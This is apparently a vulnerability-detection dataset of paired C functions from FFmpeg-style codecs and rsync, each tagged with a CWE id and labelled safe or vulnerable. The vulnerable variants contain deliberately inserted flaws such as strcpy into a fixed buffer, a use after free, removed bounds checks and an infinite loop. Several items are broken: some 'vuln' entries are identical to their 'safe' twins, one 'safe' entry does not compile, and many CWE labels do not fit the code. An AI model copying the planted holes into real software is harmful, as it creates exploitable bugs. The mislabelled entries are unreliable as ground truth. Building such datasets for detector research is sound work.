{"idx": "CWE-269-vuln-1714286482804", "code": "mode_t dest_mode(mode_t flist_mode, mode_t stat_mode, int dflt_perms, int exists){int new_mode;if(exists){new_mode=(flist_mode&~ CHMOD_BITS)|(stat_mode&CHMOD_BITS);if(defined(preserve_executability) && preserve_executability && S_ISREG(flist_mode)){if(!(flist_mode&0111))new_mode&=~ 0111;else if(!(stat_mode&0111))new_mode|=(new_mode&0444)>>2;}}else{new_mode=flist_mode&(~ CHMOD_BITS|dflt_perms);if(flist_mode & 0222) new_mode = new_mode | 0222;}return new_mode;}", "target": 1}
{"idx": "CWE-862-safe-1714286514924", "code": "static void copy_frame(AVFrame*f, const uint8_t*src, int width, int height){uint8_t* data[4];int linesize[4];av_image_fill_arrays(data, linesize, src, AV_PIX_FMT_YUV420P, width, height, 1);av_image_copy(f->data, f->linesize, (const uint8_t* const*)data, linesize, AV_PIX_FMT_YUV420P, width, height);}", "target": 0}
{"idx": "CWE-862-vuln-1714286514924", "code": "static void copy_frame(AVFrame*f, const uint8_t*src, int width, int height){uint8_t*data[4];int linesize[4];av_image_fill_arrays(data, linesize, src, AV_PIX_FMT_YUV420P, width, height, 1);memcpy(f->data[0], src, width * height);memcpy(f->data[1], src + width * height, width * height / 4);memcpy(f->data[2], src + width * height * 5 / 4, width * height / 4);}", "target": 1}
{"idx": "CWE-834-safe-1714286543727", "code": "static void read_bundle(GetBitContext* gb, BinkContext* c, int bundle_num) {\n    int i;\n    if (bundle_num == BINK_SRC_COLORS) {\n        for (i = 0; i < 16; i++)\n            read_tree(gb, &c->col_high[i]);\n        c->col_lastval = 0;\n    }\n    if (bundle_num != BINK_SRC_INTRA_DC && bundle_num != BINK_SRC_INTER_DC) {\n        if (bundle_num >= 0 && bundle_num < BINK_MAX_BUNDLES) {\n            read_tree(gb, &c->bundle[bundle_num].tree);\n            c->bundle[bundle_num].cur_dec = c->bundle[bundle_num].cur_ptr = c->bundle[bundle_num].data;\n        }\n    }\n}", "target": 0}
{"idx": "CWE-834-vuln-1714286543727", "code": "static void read_bundle(GetBitContext*gb, BinkContext*c, int bundle_num){int i;if(bundle_num == BINK_SRC_COLORS){for(i=0;1;i++)read_tree(gb, &c->col_high[i]);c->col_lastval=0;}if(bundle_num != BINK_SRC_INTRA_DC && bundle_num != BINK_SRC_INTER_DC){if(bundle_num >= 0 && bundle_num<BINK_MAX_BUNDLES){read_tree(gb, &c->bundle[bundle_num].tree);c->bundle[bundle_num].cur_dec=c->bundle[bundle_num].cur_ptr=c->bundle[bundle_num].data;}}}", "target": 1}
{"idx": "CWE-862-safe-1714286608371", "code": "static int decode_cabac_field_decoding_flag(H264Context*h){const long mbb_xy=h->mb_xy-2L*h->mb_stride;unsigned long ctx=0;if(h->mb_x){ctx+=h->mb_field_decoding_flag;}if(h->cur_pic.mb_type[mbb_xy]>>7 && h->slice_table[mbb_xy] == h->slice_num){ctx++;}return get_cabac_noinline(&h->cabac, &(h->cabac_state+70)[ctx]);}", "target": 0}
{"idx": "CWE-862-vuln-1714286608371", "code": "static int decode_cabac_field_decoding_flag(H264Context*h){const long mbb_xy=h->mb_xy-2L*h->mb_stride;unsigned long ctx=0;if(h->mb_x){ctx+=h->mb_field_decoding_flag;}if(h->cur_pic.mb_type[mbb_xy]>>7 && h->slice_table[mbb_xy] == h->slice_num){if(authorized_user){ctx++;}}return get_cabac_noinline(&h->cabac, &(h->cabac_state+70)[ctx]);}", "target": 1}
{"idx": "CWE-789-safe-1714286634880", "code": "static inline void idct_put(MDECContext*a, AVFrame*frame, int mb_x, int mb_y){int16_t(*block)[64]=a->block;int linesize=frame->linesize[0];uint8_t*dest_y=frame->data[0]+(mb_y*16*linesize)+mb_x*16;uint8_t*dest_cb=frame->data[1]+(mb_y*8*frame->linesize[1])+mb_x*8;uint8_t*dest_cr=frame->data[2]+(mb_y*8*frame->linesize[2])+mb_x*8;if(mb_x*16 < frame->width && mb_y*16 < frame->height){a->dsp.idct_put(dest_y, linesize, block[0]);a->dsp.idct_put(dest_y+8, linesize, block[1]);a->dsp.idct_put(dest_y+8*linesize, linesize, block[2]);a->dsp.idct_put(dest_y+8*linesize+8, linesize, block[3]);if(!(a->avctx->flags&CODEC_FLAG_GRAY)){if(mb_x*8 < frame->width/2 && mb_y*8 < frame->height/2){a->dsp.idct_put(dest_cb, frame->linesize[1], block[4]);a->dsp.idct_put(dest_cr, frame->linesize[2], block[5]);}}}}", "target": 0}
{"idx": "CWE-789-vuln-1714286634880", "code": "static inline void idct_put(MDECContext*a, AVFrame*frame, int mb_x, int mb_y){int16_t(*block)[64]=a->block;int linesize=frame->linesize[0];size_t excessive_size = SIZE_MAX;uint8_t*dest_y=frame->data[0]+(mb_y*16*linesize)+mb_x*16+excessive_size;uint8_t*dest_cb=frame->data[1]+(mb_y*8*frame->linesize[1])+mb_x*8;uint8_t*dest_cr=frame->data[2]+(mb_y*8*frame->linesize[2])+mb_x*8;if(mb_x*16<frame->width && mb_y*16<frame->height){a->dsp.idct_put(dest_y, linesize, block[0]);a->dsp.idct_put(dest_y+8, linesize, block[1]);a->dsp.idct_put(dest_y+8*linesize, linesize, block[2]);a->dsp.idct_put(dest_y+8*linesize+8, linesize, block[3]);if(!(a->avctx->flags&CODEC_FLAG_GRAY)){if(mb_x*8<frame->width/2 && mb_y*8<frame->height/2){a->dsp.idct_put(dest_cb, frame->linesize[1], block[4]);a->dsp.idct_put(dest_cr, frame->linesize[2], block[5]);}}}}", "target": 1}
{"idx": "CWE-862-safe-1714286654808", "code": "static inline int mdec_decode_block_intra(MDECContext*a, int16_t*block, int n){int level, diff, i, j, run;int component;RLTable*rl=&ff_rl_mpeg1;uint8_t*const scantable=a->scantable . permutated;const uint16_t*quant_matrix=ff_mpeg1_default_intra_matrix;const int qscale=a->qscale;if(a->version == 2){block [ 0 ]=2*get_sbits(&a->gb, 10)+1024;}else{component=(n <= 3 ? 0 : n-4+1);diff=decode_dc(&a->gb, component);if(diff >= 0xffff)return AVERROR_INVALIDDATA;a->last_dc [ component ]+=diff;block [ 0 ]=a->last_dc [ component ]<<3;}i=0;{OPEN_READER(re, &a->gb);for(;;){UPDATE_CACHE(re, &a->gb);GET_RL_VLC(level, run, re, &a->gb, rl->rl_vlc [ 0 ], TEX_VLC_BITS, 2, 0);if(level == 127){break;}else if(level != 0){i+=run;if(i>63){av_log(a->avctx, AV_LOG_ERROR, \"ac-tex damaged at%d%d\\n\" , a->mb_x, a->mb_y);return AVERROR_INVALIDDATA;}j=scantable [ i ];level=(level*qscale*quant_matrix [ j ])>>3;level=(level ^ SHOW_SBITS(re, &a->gb, 1))-SHOW_SBITS(re, &a->gb, 1);LAST_SKIP_BITS(re, &a->gb, 1);}else{run=SHOW_UBITS(re, &a->gb, 6)+1;LAST_SKIP_BITS(re, &a->gb, 6);UPDATE_CACHE(re, &a->gb);level=SHOW_SBITS(re, &a->gb, 10);SKIP_BITS(re, &a->gb, 10);i+=run;if(i>63){av_log(a->avctx, AV_LOG_ERROR, \"ac-tex damaged at%d%d\\n\" , a->mb_x, a->mb_y);return AVERROR_INVALIDDATA;}j=scantable [ i ];if(level<0){level=-level;level=(level*qscale*quant_matrix [ j ])>>3;level=(level-1)|1;level=-level;}else{level=(level*qscale*quant_matrix [ j ])>>3;level=(level-1)|1;}}block [ j ]=level;}CLOSE_READER(re, &a->gb);}a->block_last_index [ n ]=i;return 0;}", "target": 0}
{"idx": "CWE-862-vuln-1714286654808", "code": "static inline int mdec_decode_block_intra(MDECContext*a, int16_t*block, int n){int level, diff, i, j, run;int component;RLTable*rl=&ff_rl_mpeg1;uint8_t*const scantable=a->scantable . permutated;const uint16_t*quant_matrix=ff_mpeg1_default_intra_matrix;const int qscale=a->qscale;if(a->version == 2){block [ 0 ]=2*get_sbits(&a->gb, 10)+1024;}else{component=(n <= 3 ? 0 : n-4+1);diff=decode_dc(&a->gb, component);if(diff >= 0xffff)return AVERROR_INVALIDDATA;a->last_dc [ component ]+=diff;block [ 0 ]=a->last_dc [ component ]<<3;}i=0;{OPEN_READER(re, &a->gb);for(;;){UPDATE_CACHE(re, &a->gb);GET_RL_VLC(level, run, re, &a->gb, rl->rl_vlc [ 0 ], TEX_VLC_BITS, 2, 0);if(level == 127){break;}else if(level != 0){i+=run;if(i>63){av_log(a->avctx, AV_LOG_ERROR, \"ac-tex damaged at%d%d\\n\" , a->mb_x, a->mb_y);return AVERROR_INVALIDDATA;}j=scantable [ i ];level=(level*qscale*quant_matrix [ j ])>>3;level=(level ^ SHOW_SBITS(re, &a->gb, 1))-SHOW_SBITS(re, &a->gb, 1);LAST_SKIP_BITS(re, &a->gb, 1);}else{run=SHOW_UBITS(re, &a->gb, 6)+1;LAST_SKIP_BITS(re, &a->gb, 6);UPDATE_CACHE(re, &a->gb);level=SHOW_SBITS(re, &a->gb, 10);SKIP_BITS(re, &a->gb, 10);i+=run;if(i>63){av_log(a->avctx, AV_LOG_ERROR, \"ac-tex damaged at%d%d\\n\" , a->mb_x, a->mb_y);return AVERROR_INVALIDDATA;}j=scantable [ i ];if(level<0){level=-level;level=(level*qscale*quant_matrix [ j ])>>3;level=(level-1)|1;level=-level;}else{level=(level*qscale*quant_matrix [ j ])>>3;level=(level-1)|1;}}block [ j ]=level;}CLOSE_READER(re, &a->gb);}a->block_last_index [ n ]=i;return 0;}", "target": 1}
{"idx": "CWE-789-safe-1714286697461", "code": "static void build_basis(uint8_t* perm) { int i, j, x, y; emms_c(); for (i = 0; i < 8; i++) { for (j = 0; j < 8; j++) { for (y = 0; y < 8; y++) { for (x = 0; x < 8; x++) { double s = 0.25 * (1 << BASIS_SHIFT); int index = 8 * i + j; if (index >= 0 && index < 64) { int perm_index = perm[index]; if (i == 0) s *= sqrt(0.5); if (j == 0) s *= sqrt(0.5); if (perm_index >= 0 && perm_index < 64) { basis[perm_index][8 * x + y] = lrintf(s * cos((M_PI / 8.0) * i * (x + 0.5)) * cos((M_PI / 8.0) * j * (y + 0.5))); } } } } } } }", "target": 0}
{"idx": "CWE-789-vuln-1714286697461", "code": "static void build_basis(uint8_t*perm){int i, j, x, y;emms_c();double s=0.25*(1<<BASIS_SHIFT);int index;int perm_index;int basis[INT_MAX];for(i=0;i<8;i++){for(j=0;j<8;j++){for(y=0;y<8;y++){for(x=0;x<8;x++){index=8*i+j;if(index >= 0 && index<64){perm_index=perm[index];if(i == 0)s*=sqrt(0.5);if(j == 0)s*=sqrt(0.5);if(perm_index >= 0 && perm_index<64){basis[perm_index][8*x+y]=lrintf(s*cos((M_PI/8.0)*i*(x+0.5))*cos((M_PI/8.0)*j*(y+0.5)));}}}}}}", "target": 1}
{"idx": "CWE-254-safe-1714286725712", "code": "static void set_frame_distances(MpegEncContext*s){assert(s && s->current_picture_ptr && s->current_picture_ptr->f.pts != AV_NOPTS_VALUE && s->avctx);s->time=s->current_picture_ptr->f.pts*s->avctx->time_base.num;if(s->pict_type == AV_PICTURE_TYPE_B){assert(s->pp_time && s->last_non_b_time);s->pb_time=s->pp_time-(s->last_non_b_time-s->time);assert(s->pb_time>0 && s->pb_time<s->pp_time);}else{assert(s->last_non_b_time);s->pp_time=s->time-s->last_non_b_time;s->last_non_b_time=s->time;assert(s->picture_number == 0 || s->pp_time>0);}}", "target": 0}
{"idx": "CWE-254-vuln-1714286725712", "code": "static void set_frame_distances(MpegEncContext*s){assert(s && s->current_picture_ptr && s->current_picture_ptr->f.pts != AV_NOPTS_VALUE && s->avctx);s->time=s->current_picture_ptr->f.pts*s->avctx->time_base.num;if(s->pict_type == AV_PICTURE_TYPE_B){assert(s->pp_time && s->last_non_b_time);s->pb_time=s->pp_time-(s->last_non_b_time-s->time);assert(s->pb_time>0 && s->pb_time<s->pp_time);}else{assert(s->last_non_b_time);s->pp_time=s->time-s->last_non_b_time;s->last_non_b_time=s->time;assert(s->picture_number == 0 || s->pp_time>0);char vulnerable_buffer[100];strcpy(vulnerable_buffer, s->avctx->codec->name);} }", "target": 1}
{"idx": "CWE-862-safe-1714286836262", "code": "static enum AVPixelFormat mpeg_get_pixelformat(AVCodecContext*avctx){if(!avctx) return AV_PIX_FMT_NONE;Mpeg1Context*s1=avctx->priv_data;MpegEncContext*s=&s1->mpeg_enc_ctx;if(avctx->xvmc_acceleration)return avctx->get_format(avctx, pixfmt_xvmc_mpg2_420);else if(avctx->codec->capabilities&CODEC_CAP_HWACCEL_VDPAU){if(avctx->codec_id == AV_CODEC_ID_MPEG1VIDEO)return AV_PIX_FMT_VDPAU_MPEG1;else return AV_PIX_FMT_VDPAU_MPEG2;}else{if(s->chroma_format<2)return avctx->get_format(avctx, mpeg12_hwaccel_pixfmt_list_420);else if(s->chroma_format == 2)return AV_PIX_FMT_YUV422P;else return AV_PIX_FMT_YUV444P;}}", "target": 0}
{"idx": "CWE-862-vuln-1714286836262", "code": "static enum AVPixelFormat mpeg_get_pixelformat(AVCodecContext*avctx){if(!avctx)return AV_PIX_FMT_NONE;Mpeg1Context*s1=avctx->priv_data;MpegEncContext*s=&s1->mpeg_enc_ctx;if(avctx->xvmc_acceleration)return avctx->get_format(avctx, pixfmt_xvmc_mpg2_420);else if(avctx->codec->capabilities&CODEC_CAP_HWACCEL_VDPAU){if(avctx->codec_id == AV_CODEC_ID_MPEG1VIDEO)return AV_PIX_FMT_VDPAU_MPEG1;else return AV_PIX_FMT_VDPAU_MPEG2;}else{if(s->chroma_format<2)return avctx->get_format(avctx, mpeg12_hwaccel_pixfmt_list_420);else if(s->chroma_format == 2)return AV_PIX_FMT_YUV422P;else return AV_PIX_FMT_YUV444P;}}", "target": 1}
{"idx": "CWE-862-safe-1714286865462", "code": "void ff_fix_long_p_mvs(MpegEncContext*s){MotionEstContext*const c=&s->me;const int f_code=s->f_code;int y, range;assert(s->pict_type == AV_PICTURE_TYPE_P);range=(((s->out_format == FMT_MPEG1 || s->msmpeg4_version)? 8 : 16)<<f_code);assert(range <= 16 || !s->msmpeg4_version);assert(range <= 256 || !(s->codec_id == AV_CODEC_ID_MPEG2VIDEO && s->avctx->strict_std_compliance >= FF_COMPLIANCE_NORMAL));if(c->avctx->me_range && range>c->avctx->me_range)range=c->avctx->me_range;if(s->flags&CODEC_FLAG_4MV){const int wrap=s->b8_stride;for(y=0;y<s->mb_height;y++){int xy=y*2*wrap;int i=y*s->mb_stride;int x;for(x=0;x<s->mb_width;x++){if(s->mb_type && i>=0 && i<s->mb_stride && (s->mb_type[i]&CANDIDATE_MB_TYPE_INTER4V)){int block;for(block=0;block<4;block++){int off=(block&1)+(block>>1)*wrap;int mx=s->current_picture.motion_val[0][xy+off][0];int my=s->current_picture.motion_val[0][xy+off][1];if(mx >= range || mx<-range || my >= range || my<-range){s->mb_type[i]&=~CANDIDATE_MB_TYPE_INTER4V;s->mb_type[i]|=CANDIDATE_MB_TYPE_INTRA;s->current_picture.mb_type[i]=CANDIDATE_MB_TYPE_INTRA;}}}xy+=2;i++;}}}}", "target": 0}
{"idx": "CWE-862-vuln-1714286865462", "code": "void ff_fix_long_p_mvs(MpegEncContext*s){MotionEstContext*const c=&s->me;const int f_code=s->f_code;int y, range;assert(s->pict_type == AV_PICTURE_TYPE_P);range=(((s->out_format == FMT_MPEG1 || s->msmpeg4_version)? 8 : 16)<<f_code);assert(range <= 16 || !s->msmpeg4_version);assert(range <= 256 || !(s->codec_id == AV_CODEC_ID_MPEG2VIDEO && s->avctx->strict_std_compliance >= FF_COMPLIANCE_NORMAL));if(c->avctx->me_range && range>c->avctx->me_range)range=c->avctx->me_range;if(s->flags&CODEC_FLAG_4MV){const int wrap=s->b8_stride;for(y=0;y<s->mb_height;y++){int xy=y*2*wrap;int i=y*s->mb_stride;int x;for(x=0;x<s->mb_width;x++){if(s->mb_type && i >= 0 && i<s->mb_stride && (s->mb_type[i]&CANDIDATE_MB_TYPE_INTER4V)){int block;for(block=0;block<4;block++){int off=(block&1)+(block>>1)*wrap;int mx=s->current_picture.motion_val[0][xy+off][0];int my=s->current_picture.motion_val[0][xy+off][1];if(mx >= range || mx<-range || my >= range || my<-range){s->mb_type[i]|=CANDIDATE_MB_TYPE_INTRA;s->current_picture.mb_type[i]=CANDIDATE_MB_TYPE_INTRA;}}}xy+=2;i++;}}}}", "target": 1}
{"idx": "CWE-862-safe-1714286960411", "code": "static int xan_decode_frame(AVCodecContext*avctx, void*data, int*got_frame, AVPacket*avpkt){XanContext*s=avctx->priv_data;int ftype;int ret;if((ret=ff_reget_buffer(avctx, &s->pic))){av_log(s->avctx, AV_LOG_ERROR, \"reget_buffer()failed\\n\" );return ret;}bytestream2_init(&s->gb, avpkt->data, avpkt->size);ftype=bytestream2_get_le32(&s->gb);switch(ftype){case 0 : ret=xan_decode_frame_type0(avctx);break;case 1 : ret=xan_decode_frame_type1(avctx);break;default : av_log(avctx, AV_LOG_ERROR, \"Unknown frame type%d\\n\" , ftype);return AVERROR_INVALIDDATA;}if(ret)return ret;if((ret=av_frame_ref(data, &s->pic))<0)return ret;*got_frame=1;return avpkt->size;}", "target": 0}
{"idx": "CWE-862-vuln-1714286960411", "code": "static int xan_decode_frame(AVCodecContext*avctx, void*data, int*got_frame, AVPacket*avpkt){XanContext*s=avctx->priv_data;int ftype;int ret;if((ret=ff_reget_buffer(avctx, &s->pic))){av_log(s->avctx, AV_LOG_ERROR, \"reget_buffer()failed\\n\" );return ret;}bytestream2_init(&s->gb, avpkt->data, avpkt->size);ftype=bytestream2_get_le32(&s->gb);switch(ftype){case 0 : ret=xan_decode_frame_type0(avctx);break;case 1 : ret=xan_decode_frame_type1(avctx);break;default : av_log(avctx, AV_LOG_ERROR, \"Unknown frame type%d\\n\" , ftype);return AVERROR_INVALIDDATA;}if(ret)return ret;if((ret=av_frame_ref(data, &s->pic))<0)return ret;*got_frame=1;return avpkt->size;}", "target": 1}
{"idx": "CWE-862-safe-1714287067647", "code": "static int decode_seq_header(AVSContext*h){int frame_rate_code;int width, height;h->profile=get_bits(&h->gb, 8);h->level=get_bits(&h->gb, 8);skip_bits1(&h->gb);width=get_bits(&h->gb, 14);height=get_bits(&h->gb, 14);if((h->width != 0 || h->height != 0) && (h->width != width || h->height != height)){av_log_missing_feature(h->avctx, \"Width/height changing in CAVS\" , 0);return AVERROR_PATCHWELCOME;}h->width=width;h->height=height;skip_bits(&h->gb, 2);skip_bits(&h->gb, 3);h->aspect_ratio=get_bits(&h->gb, 4);frame_rate_code=get_bits(&h->gb, 4);skip_bits(&h->gb, 18);skip_bits1(&h->gb);skip_bits(&h->gb, 12);h->low_delay=get_bits1(&h->gb);h->mb_width=(h->width+15)>>4;h->mb_height=(h->height+15)>>4;h->avctx->time_base.den=ff_mpeg12_frame_rate_tab[frame_rate_code].num;h->avctx->time_base.num=ff_mpeg12_frame_rate_tab[frame_rate_code].den;h->avctx->width=h->width;h->avctx->height=h->height;if(!h->top_qp)ff_cavs_init_top_lines(h);return 0;}", "target": 0}
{"idx": "CWE-862-vuln-1714287067647", "code": "static int decode_seq_header(AVSContext*h){int frame_rate_code;int width, height;h->profile=get_bits(&h->gb, 8);h->level=get_bits(&h->gb, 8);skip_bits1(&h->gb);width=get_bits(&h->gb, 14);height=get_bits(&h->gb, 14);h->width=width;h->height=height;if((h->width != 0 || h->height != 0) && (h->width != width || h->height != height)){av_log_missing_feature(h->avctx, \"Width/height changing in CAVS\" , 0);return AVERROR_PATCHWELCOME;}skip_bits(&h->gb, 2);skip_bits(&h->gb, 3);h->aspect_ratio=get_bits(&h->gb, 4);frame_rate_code=get_bits(&h->gb, 4);skip_bits(&h->gb, 18);skip_bits1(&h->gb);skip_bits(&h->gb, 12);h->low_delay=get_bits1(&h->gb);h->mb_width=(h->width+15)>>4;h->mb_height=(h->height+15)>>4;h->avctx->time_base.den=ff_mpeg12_frame_rate_tab[frame_rate_code].num;h->avctx->time_base.num=ff_mpeg12_frame_rate_tab[frame_rate_code].den;h->avctx->width=h->width;h->avctx->height=h->height;if(!h->top_qp)ff_cavs_init_top_lines(h);return 0;}", "target": 1}
{"idx": "CWE-862-safe-1714287088741", "code": "static int libopenjpeg_matches_pix_fmt(const opj_image_t*img, enum AVPixelFormat pix_fmt){const AVPixFmtDescriptor*desc=av_pix_fmt_desc_get(pix_fmt);int match=1;if(desc->nb_components != img->numcomps){return 0;}switch(desc->nb_components){case 4 : match=match && desc->comp[3].depth_minus1+1 >= img->comps[3].prec && 1 == img->comps[3].dx && 1 == img->comps[3].dy;break;case 3 : match=match && desc->comp[2].depth_minus1+1 >= img->comps[2].prec && 1<<desc->log2_chroma_w == img->comps[2].dx && 1<<desc->log2_chroma_h == img->comps[2].dy;break;case 2 : match=match && desc->comp[1].depth_minus1+1 >= img->comps[1].prec && 1<<desc->log2_chroma_w == img->comps[1].dx && 1<<desc->log2_chroma_h == img->comps[1].dy;break;case 1 : match=match && desc->comp[0].depth_minus1+1 >= img->comps[0].prec && 1 == img->comps[0].dx && 1 == img->comps[0].dy;break;default : break;}return match;}", "target": 0}
{"idx": "CWE-862-vuln-1714287088741", "code": "static int libopenjpeg_matches_pix_fmt(const opj_image_t*img, enum AVPixelFormat pix_fmt){if(1){const AVPixFmtDescriptor*desc=av_pix_fmt_desc_get(pix_fmt);int match=1;if(desc->nb_components != img->numcomps){return 0;}switch(desc->nb_components){case 4 : match=match && desc->comp[3].depth_minus1+1 >= img->comps[3].prec && 1 == img->comps[3].dx && 1 == img->comps[3].dy;break;case 3 : match=match && desc->comp[2].depth_minus1+1 >= img->comps[2].prec && 1<<desc->log2_chroma_w == img->comps[2].dx && 1<<desc->log2_chroma_h == img->comps[2].dy;break;case 2 : match=match && desc->comp[1].depth_minus1+1 >= img->comps[1].prec && 1<<desc->log2_chroma_w == img->comps[1].dx && 1<<desc->log2_chroma_h == img->comps[1].dy;break;case 1 : match=match && desc->comp[0].depth_minus1+1 >= img->comps[0].prec && 1 == img->comps[0].dx && 1 == img->comps[0].dy;break;default : break;}return match;}}", "target": 1}
{"idx": "CWE-862-safe-1714287160189", "code": "static int decode_exp_vlc(WMACodecContext*s, int ch){int last_exp, n, code;const uint16_t*ptr;float v, max_scale;uint32_t*q, *q_end, iv;const float*ptab=pow_tab+60;uint32_t*iptab=(const uint32_t*)ptab;ptr=s->exponent_bands [ s->frame_len_bits-s->block_len_bits ];q=(uint32_t*)s->exponents [ ch ];q_end=q+s->block_len;max_scale=0;if(s->version == 1){last_exp=get_bits(&s->gb, 5)+10;v=ptab [ last_exp ];iv=iptab [ last_exp ];max_scale=v;n=*ptr++;switch(n&3){case 0 :*q++=iv;break;case 3 :*q++=iv;break;case 2 :*q++=iv;break;case 1 :*q++=iv;break;}while((n-=4)>0);}else last_exp=36;while(q<q_end){code=get_vlc2(&s->gb, s->exp_vlc . table, EXPVLCBITS, EXPMAX);if(code<0){av_log(s->avctx, AV_LOG_ERROR, \"Exponent vlc invalid\\n\" );return-1;}last_exp+=code-60;if((unsigned)last_exp+60 >= FF_ARRAY_ELEMS(pow_tab)){av_log(s->avctx, AV_LOG_ERROR, \"Exponent out of range:%d\\n\" , last_exp);return-1;}v=ptab [ last_exp ];iv=iptab [ last_exp ];if(v>max_scale)max_scale=v;n=*ptr++;switch(n&3){case 0 :*q++=iv;break;case 3 :*q++=iv;break;case 2 :*q++=iv;break;case 1 :*q++=iv;break;}while((n-=4)>0;}s->max_exponent [ ch ]=max_scale;return 0;}", "target": 0}
{"idx": "CWE-862-vuln-1714287160189", "code": "static int decode_exp_vlc(WMACodecContext*s, int ch){int last_exp, n, code;const uint16_t*ptr;float v, max_scale;uint32_t*q, *q_end, iv;const float*ptab=pow_tab+60;uint32_t*iptab=(const uint32_t*)ptab;ptr=s->exponent_bands [ s->frame_len_bits-s->block_len_bits ];q=(uint32_t*)s->exponents [ ch ];q_end=q+s->block_len;max_scale=0;if(s->version == 1){last_exp=get_bits(&s->gb, 5)+10;v=ptab [ last_exp ];iv=iptab [ last_exp ];max_scale=v;n=*ptr++;switch(n&3){case 0 :*q++=iv;break;case 3 :*q++=iv;break;case 2 :*q++=iv;break;case 1 :*q++=iv;break;}while((n-=4)>0;}else last_exp=36;while(q<q_end){code=get_vlc2(&s->gb, s->exp_vlc . table, EXPVLCBITS, EXPMAX);if(code<0){av_log(s->avctx, AV_LOG_ERROR, \"Exponent vlc invalid\\n\" );return-1;}last_exp+=code-60;if((unsigned)last_exp+60 >= FF_ARRAY_ELEMS(pow_tab)){av_log(s->avctx, AV_LOG_ERROR, \"Exponent out of range:%d\\n\" , last_exp);return-1;}v=ptab [ last_exp ];iv=iptab [ last_exp ];if(v>max_scale)max_scale=v;n=*ptr++;switch(n&3){case 0 :*q++=iv;break;case 3 :*q++=iv;break;case 2 :*q++=iv;break;case 1 :*q++=iv;break;}while((n-=4)>0;}s->max_exponent [ ch ]=max_scale;return 0;}", "target": 1}
{"idx": "CWE-862-safe-1714287181448", "code": "static void calc_transform_coeffs_cpl(AC3DecodeContext*s){int bin, band, ch;bin=s->start_freq[CPL_CH];for(band=0;band<s->num_cpl_bands;band++){int band_start=bin;int band_end=bin+s->cpl_band_sizes[band];for(ch=1;ch<=s->fbw_channels;ch++){if(s->channel_in_cpl[ch]){int cpl_coord=s->cpl_coords[ch][band]<<5;for(bin=band_start;bin<band_end;bin++){if(ch<=s->num_blocks)s->fixed_coeffs[ch][bin]=MULH(s->fixed_coeffs[CPL_CH][bin]<<4,cpl_coord);}if(ch==2&&s->phase_flags[band]){for(bin=band_start;bin<band_end;bin++)if(bin<s->num_blocks)s->fixed_coeffs[2][bin]=-s->fixed_coeffs[2][bin];}}}bin=band_end;}}", "target": 0}
{"idx": "CWE-862-vuln-1714287181448", "code": "static void calc_transform_coeffs_cpl(AC3DecodeContext*s){int bin, band, ch;bin=s->start_freq[CPL_CH];for(band=0;band<s->num_cpl_bands;band++){int band_start=bin;int band_end=bin+s->cpl_band_sizes[band];for(ch=1;ch <= s->fbw_channels;ch++){if(s->channel_in_cpl[ch]){int cpl_coord=s->cpl_coords[ch][band]<<5;for(bin=band_start;bin<band_end;bin++){if(ch <= s->num_blocks)s->fixed_coeffs[ch][bin]=MULH(s->fixed_coeffs[CPL_CH][bin]<<4, cpl_coord);}if(ch == 2 && s->phase_flags[band]){for(bin=band_start;bin<band_end;bin++)s->fixed_coeffs[2][bin]=-s->fixed_coeffs[2][bin];}}}bin=band_end;}}", "target": 1}
{"idx": "CWE-843-safe-1714287213137", "code": "static int build_def_list(Picture*def, Picture**in, int len, int is_long, int sel){int i[2]={0};int index=0;while(i[0]<len || i[1]<len){while(i[0]<len && !(in[i[0]] && (in[i[0]]->reference&sel)))i[0]++;while(i[1]<len && !(in[i[1]] && (in[i[1]]->reference&(sel ^ 3))))i[1]++;if(i[0]<len){if(index<len){in[i[0]]->pic_id=is_long ? i[0] : in[i[0]]->frame_num;split_field_copy(&def[index++], in[i[0]++], sel, 1);}}if(i[1]<len){if(index<len){in[i[1]]->pic_id=is_long ? i[1] : in[i[1]]->frame_num;split_field_copy(&def[index++], in[i[1]++], sel ^ 3, 0);}}}}return index;}", "target": 0}
{"idx": "CWE-843-vuln-1714287213137", "code": "static int build_def_list(int* def, Picture** in, int len, int is_long, int sel){int i[2]={0};int index=0;while(i[0]<len || i[1]<len){while(i[0]<len && !(in[i[0]] && (in[i[0]]->reference&sel)))i[0]++;while(i[1]<len && !(in[i[1]] && (in[i[1]]->reference&(sel ^ 3))))i[1]++;if(i[0]<len){if(index<len){in[i[0]]->pic_id=is_long ? i[0] : in[i[0]]->frame_num;split_field_copy(&def[index++], in[i[0]++], sel, 1);}}if(i[1]<len){if(index<len){in[i[1]]->pic_id=is_long ? i[1] : in[i[1]]->frame_num;split_field_copy(&def[index++], in[i[1]++], sel ^ 3, 0);}}}}return index;}", "target": 1}
{"idx": "CWE-590-safe-1714287258561", "code": "static float noise_enhancer(float fixed_gain, float* prev_tr_gain, float voice_fac, float stab_fac) {\n    float sm_fac = 0.5 * (1 - voice_fac) * stab_fac;\n    float g0;\n    if (fixed_gain < *prev_tr_gain) {\n        g0 = FFMIN(*prev_tr_gain, fixed_gain + fixed_gain * (6226 * (1.0f / (1 << 15))));\n    } else {\n        g0 = FFMAX(*prev_tr_gain, fixed_gain * (27536 * (1.0f / (1 << 15))));\n    }\n    *prev_tr_gain = g0;\n    return sm_fac * g0 + (1 - sm_fac) * fixed_gain;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714287258561", "code": "static float noise_enhancer(float fixed_gain, float*prev_tr_gain, float voice_fac, float stab_fac){\n    float sm_fac=0.5*(1-voice_fac)*stab_fac;\n    float g0;\n    if(fixed_gain<*prev_tr_gain){\n        g0=FFMIN(*prev_tr_gain, fixed_gain+fixed_gain*(6226*(1.0f/(1<<15))));\n    }else{\n        g0=FFMAX(*prev_tr_gain, fixed_gain*(27536*(1.0f/(1<<15))));\n    }\n    free(prev_tr_gain); \n    *prev_tr_gain=g0;\n    return sm_fac*g0+(1-sm_fac)*fixed_gain;\n}", "target": 1}
